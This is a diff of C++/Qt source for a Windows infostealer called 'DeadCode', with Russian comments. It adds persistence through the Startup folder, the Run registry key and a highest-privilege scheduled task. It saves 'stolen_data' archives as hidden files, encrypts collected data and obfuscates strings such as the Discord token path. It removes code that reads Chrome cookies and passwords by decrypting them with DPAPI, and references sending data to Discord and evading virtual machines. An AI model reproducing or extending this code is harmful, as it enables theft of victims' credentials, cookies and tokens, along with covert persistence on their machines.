@@ -51,6 +51,7 @@
 #include <openssl/rand.h>
 #include <QThreadPool> // Добавлено для многопоточности
 #include <QRunnable>   // Добавлено для многопоточности
+#include <cstring> // Для memcpy
 
 // Зашифрованные строки
 const std::string encryptedDiscordPath = "\xC0\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3\xC2\xE5\xF0\xC4\xE5\xF3"; // "\\discord\\Local Storage\\leveldb\\"
@@ -416,12 +417,14 @@ std::string MainWindow::stealBrowserData(const std::string& tempDir) {
 
 // Обновленный метод saveToLocalFile
 void MainWindow::saveToLocalFile(const std::string& data, const std::string& tempDir) {
-    std::string persistPath = tempDir + "\\" + config.filename;
+    emitLog("Сохранение данных локально в директории: " + QString::fromStdString(tempDir));
+    std::string outputDir = tempDir + "\\output";
+    std::filesystem::create_directories(outputDir);
+    std::string persistPath = outputDir + "\\" + (config.filename.empty() ? "stolen_data_" + generateRandomString(8) + ".bin" : config.filename);
     std::ofstream file(persistPath, std::ios::binary);
     if (file.is_open()) {
-        file << data;
+        file.write(data.data(), data.size()); // Используем write для бинарных данных
         file.close();
-        // Устанавливаем атрибут скрытого файла
         if (SetFileAttributesA(persistPath.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
             emitLog("Файл сохранен и скрыт: " + QString::fromStdString(persistPath));
         } else {
@@ -1561,10 +1564,12 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
     }
 
     std::string zipPath = dir + "\\stolen_data_" + generateRandomString(8) + ".zip";
-    int err = 0;
+    zip_error_t err;
+    zip_error_init(&err); // Инициализация структуры zip_error_t
     zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
     if (!zip) {
-        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString::number(err));
+        emitLog("Ошибка: Не удалось создать ZIP-архив: " + QString::fromStdString(zip_error_strerror(&err)));
+        zip_error_fini(&err); // Очистка структуры
         return "";
     }
 
@@ -1575,15 +1580,20 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
             continue;
         }
 
-        zip_source_t* source = zip_source_file_create(filePath.c_str(), 0, -1, &err);
+        zip_error_t sourceErr;
+        zip_error_init(&sourceErr); // Инициализация структуры для источника
+        zip_source_t* source = zip_source_file_create(filePath.c_str(), 0, -1, &sourceErr);
         if (!source) {
-            emitLog("Ошибка создания источника для файла " + QString::fromStdString(filePath) + ": " + QString::number(err));
+            emitLog("Ошибка создания источника для файла " + QString::fromStdString(filePath) + ": " + 
+                    QString::fromStdString(zip_error_strerror(&sourceErr)));
+            zip_error_fini(&sourceErr); // Очистка структуры
             continue;
         }
 
         std::string fileName = std::filesystem::path(filePath).filename().string();
         if (zip_file_add(zip, fileName.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
-            emitLog("Ошибка добавления файла в архив: " + QString::fromStdString(fileName));
+            emitLog("Ошибка добавления файла в архив: " + QString::fromStdString(fileName) + ": " + 
+                    QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
             zip_source_free(source);
             continue;
         }
@@ -1593,22 +1603,25 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
     if (!hasFiles) {
         emitLog("Ошибка: Нет файлов для добавления в ZIP-архив");
         zip_discard(zip);
+        zip_error_fini(&err); // Очистка структуры
         return "";
     }
 
     if (zip_close(zip) < 0) {
         emitLog("Ошибка закрытия ZIP-архива: " + QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
         zip_discard(zip);
+        zip_error_fini(&err); // Очистка структуры
         return "";
     }
 
+    zip_error_fini(&err); // Очистка структуры после успешного завершения
     emitLog("ZIP-архив успешно создан: " + QString::fromStdString(zipPath));
     return zipPath;
 }
 
 // Реализация encryptData
 std::string MainWindow::encryptData(const std::string& data) {
-    emitLog(decryptString(encryptedLogMessage, 0) + "Шифрование данных...");
+    emitLog(QString::fromStdString(decryptString(encryptedLogMessage, 0)) + "Шифрование данных...");
 
     if (encryptionKey1.empty() || encryptionKey2.empty() || encryptionSalt.empty()) {
         generateEncryptionKeys();
@@ -1623,7 +1636,7 @@ std::string MainWindow::encryptData(const std::string& data) {
 
     QByteArray aesData = applyAES(xorData, key2, iv);
     if (aesData.isEmpty()) {
-        emitLog(decryptString(encryptedLogMessage, 0) + "Не удалось зашифровать данные с помощью AES");
+        emitLog(QString::fromStdString(decryptString(encryptedLogMessage, 0)) + "Не удалось зашифровать данные с помощью AES");
         return "";
     }
 
@@ -1631,7 +1644,7 @@ std::string MainWindow::encryptData(const std::string& data) {
     result.append(reinterpret_cast<const char*>(iv.data()), iv.size());
     result.append(aesData.constData(), aesData.size());
 
-    emitLog(decryptString(encryptedSuccessMessage, 0) + ": Данные зашифрованы, размер: " + QString::number(result.size()).toStdString());
+    emitLog(QString::fromStdString(decryptString(encryptedSuccessMessage, 0)) + ": Данные зашифрованы, размер: " + QString::number(result.size()));
     return result;
 }
 
@@ -1777,29 +1790,6 @@ void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::s
     }
 }
 
-// Реализация saveToLocalFile
-void MainWindow::saveToLocalFile(const std::string& data, const std::string& dir) {
-    emitLog("Сохранение данных локально в директории: " + QString::fromStdString(dir));
-
-    std::string outputDir = dir + "\\output";
-    std::filesystem::create_directories(outputDir);
-
-    std::string destPath = outputDir + "\\stolen_data_" + generateRandomString(8) + ".bin";
-    std::ofstream outFile(destPath, std::ios::binary);
-    if (outFile.is_open()) {
-        outFile.write(data.data(), data.size());
-        outFile.close();
-        // Устанавливаем атрибут скрытого файла
-        if (SetFileAttributesA(destPath.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
-            emitLog("Данные успешно сохранены и скрыты: " + QString::fromStdString(destPath));
-        } else {
-            emitLog("Ошибка установки атрибута скрытия для файла: " + QString::number(GetLastError()));
-        }
-    } else {
-        emitLog("Ошибка: Не удалось сохранить данные локально: " + QString::fromStdString(destPath));
-    }
-}
-
 // Реализация sendData
 void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
     std::string data = encryptedData.toStdString();
@@ -1812,26 +1802,90 @@ void MainWindow::sendData(const QString& encryptedData, const std::vector<std::s
     }
 }
 
-// Реализация setupPersistence (новое)
+// Настройка персистентности и автозагрузки
 void MainWindow::setupPersistence() {
-    if (!config.persist) return;
-
-    emitLog("Настройка персистентности через планировщик задач...");
-
-    char exePath[MAX_PATH];
-    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
-        emitLog("Ошибка: Не удалось получить путь к исполняемому файлу");
+    if (!config.autoStart && !config.persist) {
+        emitLog("Персистентность и автозагрузка отключены, пропускаем...");
         return;
     }
 
-    std::string taskName = "DeadCodePersistence_" + generateRandomString(4);
-    std::string command = "schtasks /create /tn \"" + taskName + "\" /tr \"" + std::string(exePath) + "\" /sc onlogon /rl highest /f";
+    emitLog("Настройка персистентности и автозагрузки...");
 
-    if (system(command.c_str()) == 0) {
-        emitLog("Задача успешно создана в планировщике задач: " + QString::fromStdString(taskName));
-    } else {
-        emitLog("Ошибка создания задачи в планировщике задач");
+    char exePath[MAX_PATH];
+    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
+        emitLog("Ошибка: Не удалось получить путь к исполняемому файлу. Код ошибки: " + 
+                QString::number(GetLastError()));
+        return;
     }
+    std::string currentExePath = exePath;
+
+    // Через Startup и реестр
+    if (config.persist || config.autoStart) {
+        char* appDataPath = nullptr;
+        size_t len;
+        if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+            emitLog("Ошибка: Не удалось получить путь к APPDATA. Код ошибки: " + 
+                    QString::number(errno));
+            free(appDataPath);
+            return;
+        }
+        std::string appData(appDataPath);
+        free(appDataPath);
+
+        std::string filename = config.filename.empty() ? "DeadCode.exe" : config.filename;
+        std::string persistDir = appData + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+        std::string persistPath = persistDir + "\\" + filename;
+
+        if (config.persist) {
+            try {
+                std::filesystem::create_directories(persistDir);
+                if (std::filesystem::copy_file(currentExePath, persistPath, 
+                                               std::filesystem::copy_options::overwrite_existing)) {
+                    emitLog("Файл скопирован для персистентности: " + 
+                            QString::fromStdString(persistPath));
+                } else {
+                    emitLog("Ошибка: Не удалось скопировать файл для персистентности");
+                }
+            } catch (const std::exception& e) {
+                emitLog("Ошибка при копировании для персистентности: " + 
+                        QString::fromStdString(e.what()));
+            }
+        }
+
+        if (config.autoStart) {
+            HKEY hKey;
+            LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, 
+                                       "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
+                                       0, KEY_SET_VALUE, &hKey);
+            if (result == ERROR_SUCCESS) {
+                std::string appName = "DeadCode";
+                if (RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, 
+                                  reinterpret_cast<const BYTE*>(persistPath.c_str()), 
+                                  static_cast<DWORD>(persistPath.length() + 1)) == ERROR_SUCCESS) {
+                    emitLog("Программа добавлена в автозагрузку через реестр: " + 
+                            QString::fromStdString(appName));
+                } else {
+                    emitLog("Ошибка добавления в реестр: " + QString::number(GetLastError()));
+                }
+                RegCloseKey(hKey);
+            } else {
+                emitLog("Ошибка открытия ключа реестра: " + QString::number(result));
+            }
+        }
+    }
+
+    // Через планировщик задач
+    if (config.persist) {
+        std::string taskName = "DeadCodePersistence_" + generateRandomString(4);
+        std::string command = "schtasks /create /tn \"" + taskName + "\" /tr \"" + currentExePath + "\" /sc onlogon /rl highest /f";
+        if (system(command.c_str()) == 0) {
+            emitLog("Задача успешно создана в планировщике задач: " + QString::fromStdString(taskName));
+        } else {
+            emitLog("Ошибка создания задачи в планировщике задач");
+        }
+    }
+
+    emitLog("Настройка персистентности и автозагрузки завершена");
 }
 
 // Реализация collectSystemInfo
@@ -1930,108 +1984,6 @@ std::string MainWindow::TakeScreenshot(const std::string& dir) {
     emitLog("Скриншот сохранен: " + QString::fromStdString(screenshotPath));
     collectedFiles.push_back(screenshotPath);
     return screenshotPath;
-}
-
-// Реализация stealBrowserData (старая версия, оставлена для совместимости)
-std::string MainWindow::stealBrowserData(const std::string& dir) {
-    emitLog("Начало кражи данных браузера (старая версия, используйте новую реализацию)...");
-
-    std::string browserDir = dir + "\\BrowserData";
-    std::filesystem::create_directories(browserDir);
-
-    std::string result;
-    char* localAppDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
-        emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA");
-        free(localAppDataPath);
-        return "";
-    }
-    std::string localAppData(localAppDataPath);
-    free(localAppDataPath);
-
-    std::string chromePath = localAppData + "\\Google\\Chrome\\User Data\\Default";
-    if (!std::filesystem::exists(chromePath)) {
-        emitLog("Google Chrome не найден");
-        return "";
-    }
-
-    emitLog("Обнаружен Google Chrome, начинаем кражу данных...");
-
-    if (config.cookies) {
-        std::string cookiesPath = chromePath + "\\Network\\Cookies";
-        if (std::filesystem::exists(cookiesPath)) {
-            std::string destCookiesPath = browserDir + "\\chrome_cookies.sqlite";
-            std::filesystem::copy_file(cookiesPath, destCookiesPath, std::filesystem::copy_options::overwrite_existing);
-            emitLog("Файл куки Chrome скопирован: " + QString::fromStdString(destCookiesPath));
-
-            sqlite3* db;
-            if (sqlite3_open(destCookiesPath.c_str(), &db) == SQLITE_OK) {
-                std::string cookiesDataPath = browserDir + "\\chrome_cookies.txt";
-                std::ofstream cookiesFile(cookiesDataPath);
-                if (cookiesFile.is_open()) {
-                    sqlite3_stmt* stmt;
-                    const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
-                    if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
-                        while (sqlite3_step(stmt) == SQLITE_ROW) {
-                            std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
-                            std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
-                            QByteArray encryptedValue(reinterpret_cast<const char*>(sqlite3_column_blob(stmt, 2)), sqlite3_column_bytes(stmt, 2));
-                            QByteArray decryptedValue = decryptDPAPIData(encryptedValue);
-                            if (!decryptedValue.isEmpty()) {
-                                cookiesFile << "Host: " << host << "\nName: " << name << "\nValue: " << decryptedValue.toStdString() << "\n\n";
-                            }
-                        }
-                        sqlite3_finalize(stmt);
-                    }
-                    cookiesFile.close();
-                    emitLog("Куки Chrome извлечены: " + QString::fromStdString(cookiesDataPath));
-                    collectedFiles.push_back(cookiesDataPath);
-                    result += "Chrome Cookies: " + cookiesDataPath + "\n";
-                }
-                sqlite3_close(db);
-            }
-        }
-    }
-
-    if (config.passwords) {
-        std::string passwordsPath = chromePath + "\\Login Data";
-        if (std::filesystem::exists(passwordsPath)) {
-            std::string destPasswordsPath = browserDir + "\\chrome_logins.sqlite";
-            std::filesystem::copy_file(passwordsPath, destPasswordsPath, std::filesystem::copy_options::overwrite_existing);
-            emitLog("Файл паролей Chrome скопирован: " + QString::fromStdString(destPasswordsPath));
-
-            sqlite3* db;
-            if (sqlite3_open(destPasswordsPath.c_str(), &db) == SQLITE_OK) {
-                std::string passwordsDataPath = browserDir + "\\chrome_passwords.txt";
-                std::ofstream passwordsFile(passwordsDataPath);
-                if (passwordsFile.is_open()) {
-                    sqlite3_stmt* stmt;
-                    const char* query = "SELECT origin_url, username_value, password_value FROM logins";
-                    if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
-                        while (sqlite3_step(stmt) == SQLITE_ROW) {
-                            std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
-                            std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
-                            QByteArray encryptedPassword(reinterpret_cast<const char*>(sqlite3_column_blob(stmt, 2)), sqlite3_column_bytes(stmt, 2));
-                            QByteArray decryptedPassword = decryptDPAPIData(encryptedPassword);
-                            if (!decryptedPassword.isEmpty()) {
-                                passwordsFile << "URL: " << url << "\nUsername: " << username << "\nPassword: " << decryptedPassword.toStdString() << "\n\n";
-                            }
-                        }
-                        sqlite3_finalize(stmt);
-                    }
-                    passwordsFile.close();
-                    emitLog("Пароли Chrome извлечены: " + QString::fromStdString(passwordsDataPath));
-                    collectedFiles.push_back(passwordsDataPath);
-                    result += "Chrome Passwords: " + passwordsDataPath + "\n";
-                }
-                sqlite3_close(db);
-            }
-        }
-    }
-
-    emitLog("Кража данных браузера завершена (старая версия)");
-    return result;
 }
 
 // Класс для многопоточного извлечения токенов Discord
@@ -3001,89 +2953,6 @@ void MainWindow::appendLog(const QString& message) {
     textEdit->verticalScrollBar()->setValue(textEdit->verticalScrollBar()->maximum());
 }
 
-// Настройка персистентности и автозагрузки
-void MainWindow::setupPersistence() {
-    if (!config.autoStart && !config.persist) {
-        emitLog("Персистентность и автозагрузка отключены, пропускаем...");
-        return;
-    }
-
-    emitLog("Настройка персистентности и автозагрузки...");
-
-    // Получение пути к текущему исполняемому файлу
-    char exePath[MAX_PATH];
-    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
-        emitLog("Ошибка: Не удалось получить путь к исполняемому файлу. Код ошибки: " + 
-                QString::number(GetLastError()));
-        return;
-    }
-    std::string currentExePath = exePath;
-
-    // Получение пути к папке APPDATA
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
-        emitLog("Ошибка: Не удалось получить путь к APPDATA. Код ошибки: " + 
-                QString::number(errno));
-        free(appDataPath);
-        return;
-    }
-    std::string appData(appDataPath);
-    free(appDataPath);
-
-    // Определение имени файла и пути для персистентности
-    std::string filename = config.filename.empty() ? "DeadCode.exe" : config.filename;
-    std::string persistDir = appData + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-    std::string persistPath = persistDir + "\\" + filename;
-
-    // Копирование файла для персистентности
-    if (config.persist) {
-        try {
-            std::filesystem::create_directories(persistDir);
-            if (std::filesystem::copy_file(currentExePath, persistPath, 
-                                           std::filesystem::copy_options::overwrite_existing)) {
-                emitLog("Файл скопирован для персистентности: " + 
-                        QString::fromStdString(persistPath));
-            } else {
-                emitLog("Ошибка: Не удалось скопировать файл для персистентности в " + 
-                        QString::fromStdString(persistPath));
-            }
-        } catch (const std::filesystem::filesystem_error& e) {
-            emitLog("Ошибка файловой системы при копировании для персистентности: " + 
-                    QString::fromStdString(e.what()));
-        } catch (const std::exception& e) {
-            emitLog("Неизвестная ошибка при копировании для персистентности: " + 
-                    QString::fromStdString(e.what()));
-        }
-    }
-
-    // Добавление в автозагрузку через реестр
-    if (config.autoStart) {
-        HKEY hKey;
-        LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, 
-                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-                                   0, KEY_SET_VALUE, &hKey);
-        if (result == ERROR_SUCCESS) {
-            std::string appName = "DeadCode";
-            if (RegSetValueExA(hKey, appName.c_str(), 0, REG_SZ, 
-                              reinterpret_cast<const BYTE*>(persistPath.c_str()), 
-                              static_cast<DWORD>(persistPath.length() + 1)) == ERROR_SUCCESS) {
-                emitLog("Программа добавлена в автозагрузку через реестр: " + 
-                        QString::fromStdString(appName));
-            } else {
-                emitLog("Ошибка: Не удалось добавить программу в автозагрузку через реестр. Код ошибки: " + 
-                        QString::number(GetLastError()));
-            }
-            RegCloseKey(hKey);
-        } else {
-            emitLog("Ошибка: Не удалось открыть ключ реестра для автозагрузки. Код ошибки: " + 
-                    QString::number(result));
-        }
-    }
-
-    emitLog("Настройка персистентности и автозагрузки завершена");
-}
-
 bool MainWindow::AntiAnalysis() {
     emitLog("Проверка на анализ...");
     return isRunningInVM(); // Если работает в VM, считаем, что это анализ
@@ -3134,45 +3003,4 @@ void MainWindow::runTests() {
     } else {
         emitLog("Тесты провалены: отсутствуют зависимости");
     }
-}
-
-std::string MainWindow::generatePolymorphicCode() {
-    emitLog("Генерация полиморфного кода...");
-    std::string code = R"(
-        void polymorphicFunction() {
-            volatile int dummy = )" + std::to_string(Polymorphic::getRandomNumber(1000, 15000)) + R"(;
-            std::string noise = ")" + Polymorphic::generateRandomString(Polymorphic::getRandomNumber(5, 20)) + R"(";
-            volatile int dummy2 = dummy ^ noise.length();
-            for (int i = 0; i < )" + std::to_string(Polymorphic::getRandomNumber(3, 15)) + R"(; i++) {
-                if (dummy2 % 2 == 0) {
-                    dummy2 = (dummy2 << )" + std::to_string(Polymorphic::getRandomNumber(1, 3)) + R"() ^ noise[i % noise.length()];
-                } else {
-                    dummy2 = (dummy2 >> )" + std::to_string(Polymorphic::getRandomNumber(1, 2)) + R"() + )" + std::to_string(Polymorphic::getRandomNumber(10, 50)) + R"(;
-                }
-            }
-        }
-    )";
-    return code;
-}
-
-std::string MainWindow::generateJunkCode() {
-    emitLog("Генерация мусорного кода...");
-    std::string code = R"(
-        void junkFunction() {
-            volatile int x = )" + std::to_string(JunkCode::getRandomNumber(1000, 10000)) + R"(;
-            volatile int y = )" + std::to_string(JunkCode::getRandomNumber(500, 5000)) + R"(;
-            std::vector<int> noise;
-            for (int j = 0; j < )" + std::to_string(JunkCode::getRandomNumber(5, 20)) + R"(; ++j) {
-                noise.push_back()" + std::to_string(JunkCode::getRandomNumber(1, 100)) + R"();
-            }
-            for (size_t k = 0; k < noise.size(); ++k) {
-                if (noise[k] % 2 == 0) {
-                    x = (x ^ noise[k]) + y;
-                } else {
-                    y = (y - noise[k]) ^ x;
-                }
-            }
-        }
-    )";
-    return code;
 }
